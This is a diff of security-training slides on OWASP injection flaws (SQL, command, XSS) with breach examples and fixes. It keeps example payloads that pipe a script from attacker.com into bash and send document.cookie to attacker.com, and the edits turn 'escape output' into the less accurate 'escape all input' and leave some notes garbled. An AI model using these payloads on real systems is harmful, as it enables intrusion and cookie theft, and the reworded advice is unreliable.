@@ -1,7 +1,7 @@
 ## A05:2025 — Injection
-**🟠 High** | CWE-77 · CWE-89 · CWE-917
+CWE-77 / CWE-89 / CWE-917
 
-> Untrusted data sent to an interpreter as part of a command or query.  
+> Untrusted data sent to an interpreter as part of a command or query.
 > Detected in **94%** of analyzed applications.
 
 Note: Covers SQL, NoSQL, OS command, LDAP, XPath, EL/OGNL, and template injection. XSS (Cross-Site Scripting) is also in this category as HTML injection.
@@ -29,14 +29,19 @@ os.system(f'cat /uploads/{filename}')
 # Or: ; curl attacker.com/shell.sh | bash
 ```
 
-**XSS (HTML Injection):**
+**XSS (JS Injection):**
 ```html
 <!-- VULNERABLE — unsanitized output -->
 <p>Hello, <%= user.name %></p>
 <!-- Input: <script>fetch('https://attacker.com/?c='+document.cookie)</script> -->
 ```
 
-Note: XSS = Cross-Site Scripting — injecting malicious HTML/JavaScript into pages viewed by other users; classified as HTML injection under the 2025 Injection category. SQLi = SQL Injection. OGNL = Object-Graph Navigation Language — an expression language used by Apache Struts; exploited in the Equifax breach via a Content-Type header injection.
+Note:
+- XSS = Cross-Site Scripting injecting JavaScript into pages
+- SQLi = SQL Injection.
+- OGNL = Object-Graph Navigation Language = expression language of Apache Struts
+- NoSQL / LDAP Injection
+  Equifax breach with Content-Type header injection.
 
 --
 
@@ -52,7 +57,10 @@ Note: XSS = Cross-Site Scripting — injecting malicious HTML/JavaScript into pa
 - 70GB of private messages, posts, user data exfiltrated
 - **Impact**: All user data exposed publicly
 
-Note: LemurLoot was an ASPX webshell — a server-side script the attacker uploaded that provided persistent remote access and file exfiltration. The Cl0p ransomware group exploited this vulnerability at scale, targeting thousands of MOVEit customers simultaneously in a coordinated campaign. Gab Social (2021) used a Rails codebase that re-introduced a known SQL injection via a rebase from another project — demonstrating that code review gaps in merges are a real vector.
+Note:
+- LemurLoot = ASPX webshell the **Cl0p** ransomware group
+- Gab Social (2021) Rails codebase that re-introduced SQL injection
+  that code review gaps in merges **are a real vector**.
 
 --
 
@@ -60,7 +68,7 @@ Note: LemurLoot was an ASPX webshell — a server-side script the attacker uploa
 
 1. Use **parameterized queries** (prepared statements) — never concatenate user input
 2. Use an **ORM** that abstracts raw SQL
-3. **Escape output** based on context (HTML, JS, URL, SQL)
+3. **Escape all input to queries/statements** based on context (HTML, JS, URL, SQL)
 
 ```javascript
 // FIXED — parameterized query
@@ -77,7 +85,10 @@ execFile('cat', [sanitizedFilename], callback);
 // No shell involved → no injection possible
 ```
 
-Note: ORM = Object-Relational Mapper — a library (Hibernate, SQLAlchemy, Sequelize) that generates SQL from object operations, using parameterized queries by default. SAST = Static Application Security Testing — analyzes source code without executing it. DAST = Dynamic Application Security Testing — probes a running application (e.g. sqlmap, OWASP ZAP).
+Note:
+- ORM = (Hibernate, SQLAlchemy, Sequelize)
+- SAST = Static Application Security Testing = SONAR ...
+- DAST = Dynamic Application Security Testing = sqlmap, OWASP ZAP...
 
 --
 
